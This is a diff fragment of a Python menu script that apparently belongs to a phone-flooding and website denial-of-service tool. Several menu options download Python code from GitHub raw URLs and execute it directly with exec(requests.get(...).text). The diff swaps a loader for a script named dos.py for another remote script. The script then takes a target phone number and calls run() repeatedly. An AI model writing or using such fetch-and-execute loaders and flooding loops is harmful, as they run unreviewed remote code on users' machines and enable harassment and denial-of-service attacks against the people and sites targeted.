@@ -268,7 +268,7 @@ if chon == '1.6' :
     exec(requests.get('https://raw.githubusercontent.com/dx6791241-hue/Yyh/refs/heads/main/view_deobf.py').text)
 
 if chon == '1.7' :
-    exec(requests.get('https://raw.githubusercontent.com/Khanh23047/DOSS-WEB/main/dos.py').text)
+    exec(requests.get('https://raw.githubusercontent.com/dx6791241-hue/Yyh/refs/heads/main/text.py').text)
 
 phone = input(txt_phone)
 if phone == "0949557645":
@@ -279,6 +279,7 @@ count = int(input(txt_count))
 
 for i in range(1, count + 1):
     run(phone, i)
+
 
 
 
